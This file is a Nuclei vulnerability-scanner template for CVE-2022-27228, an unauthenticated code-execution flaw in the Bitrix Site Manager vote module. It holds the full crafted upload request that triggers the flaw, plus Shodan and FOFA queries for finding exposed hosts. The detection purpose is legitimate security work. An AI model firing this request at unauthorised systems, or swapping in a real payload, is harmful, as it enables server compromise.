flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: session_id
    regex:
    - '''bitrix_sessid'':''(.*?)'''
    type: regex
  matchers:
  - dsl:
    - contains(body, 'bitrix_sessid')
    internal: true
    type: dsl
  raw:
  - 'GET /bitrix/admin/ HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "\"status\":\"done\"")
    type: dsl
  raw:
  - 'POST /bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------xxxxxxxxxxxx


    -----------------------------xxxxxxxxxxxx

    Content-Disposition: form-data; name="bxu_files[bitrix50][NAME]"


    {{filename}}.txt

    -----------------------------xxxxxxxxxxxx

    Content-Disposition: form-data; name="bxu_files[bitrix50][NAME]";filename="{{filename}}.jpg"

    Content-Type: image/jpeg


    {{marker}}

    -----------------------------xxxxxxxxxxxx

    Content-Disposition: form-data; name="bxu_info[packageIndex]"


    pIndex101

    -----------------------------xxxxxxxxxxxx

    Content-Disposition: form-data; name="bxu_info[mode]"


    upload

    -----------------------------xxxxxxxxxxxx

    Content-Disposition: form-data; name="sessid"


    {{session_id}}

    -----------------------------xxxxxxxxxxxx

    Content-Disposition: form-data; name="bxu_info[filesCount]"


    1

    -----------------------------xxxxxxxxxxxx--

    '
id: CVE-2022-27228
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:bitrix24:bitrix24:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-27228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-20
    epss-percentile: 0.99655
    epss-score: 0.91597
  description: In the vote (aka "Polls, Votes") module before 21.0.100 of Bitrix Site
    Manager, a remote unauthenticated attacker can execute arbitrary code.
  impact: Unauthenticated attackers can execute arbitrary code remotely, potentially
    leading to full system compromise.
  metadata:
    fofa-query: body="/bitrix/"
    product: bitrix24
    shodan-query: /bitrix/p3p.xml
    vendor: bitrix24
    verified: false
  name: Bitrix Site Manager - Remote Code Execution
  reference:
  - https://alt3r.eg0.ru/p0c5/attacking_bitrix.pdf
  - https://pentestnotes.ru/notes/bitrix_pentest_full/#rce-vote_agentphp-cve-2022-27228
  - https://nvd.nist.gov/vuln/detail/CVE-2022-27228
  remediation: Update to version 21.0.100 or later.
  severity: critical
  tags: cve,cve2022,bitrix,file-upload,rce,intrusive,vkev
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
  marker: '{{randstr}}'
